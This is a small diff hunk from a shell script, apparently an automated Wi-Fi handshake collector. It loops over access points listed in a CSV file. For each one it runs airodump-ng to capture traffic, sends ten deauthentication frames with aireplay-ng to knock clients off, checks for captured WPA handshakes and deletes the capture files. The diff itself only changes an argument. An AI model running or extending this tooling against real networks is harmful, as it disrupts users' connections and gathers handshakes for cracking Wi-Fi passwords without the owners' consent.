@@ -90,7 +90,7 @@ active() {
     timeout 30 airodump-ng --bssid $bssid -w /home/kali/shakes wlan1 </dev/null >/dev/null &
     aireplay-ng -a $bssid -0 10 wlan1
     sleep 10
-    checkHandshakes $2
+    checkHandshakes $1
     rm /home/kali/shakes-* >/dev/null
   done </home/kali/shakesCollector-01.csv
 
